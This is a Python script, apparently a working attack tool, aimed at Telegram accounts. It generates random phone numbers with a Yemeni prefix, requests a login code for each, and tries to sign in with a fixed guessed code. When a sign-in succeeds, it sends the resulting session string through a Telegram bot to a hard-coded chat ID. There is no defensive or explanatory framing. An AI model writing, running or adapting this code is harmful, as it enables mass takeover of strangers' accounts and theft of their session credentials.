
import os
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError, PhoneMigrateError,PhoneNumberBannedError,PhoneCodeInvalidError, SendCodeUnavailableError, SessionPasswordNeededError
import telebot, random, asyncio

API_ID = os.environ["API_ID2"]
API_HASH = os.environ["API_HASH2"]
BOT_TOKEM = os.environ["BOT_TOKEN"]



#logging.basicConfig(level=logging.INFO)


bot = telebot.TeleBot(BOT_TOKEM)
chat_id = 1085837500


async def send(phone:str):
    
    
    for _ in range(5):
        code = 27933
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
           try:
              
              #await asyncio.sleep(5)
              await client.send_code_request(phone)
              
              await client.sign_in(phone, code)
              string = client.session.save()
              print(string)
              bot.send_message(chat_id, f"{phone} ------\n{string}")
              
           except (PhoneCodeInvalidError, SessionPasswordNeededError):
               pass
           except (SendCodeUnavailableError,PhoneMigrateError):
               print("cant send code")
               break
           except PhoneNumberBannedError:
               print("banned number")
               break
           except FloodWaitError:
               print("used")
               break
        else:
            break
    
def randNum():
    
    return  f"+96773{random.randint(1000000,9999999)}"
 
async def main():
    num = 5
    while True:
        allSend = [send(randNum()) for _ in range(num)]
        await asyncio.gather(*allSend)

if __name__ == "__main__":
  
    asyncio.run(main())

      
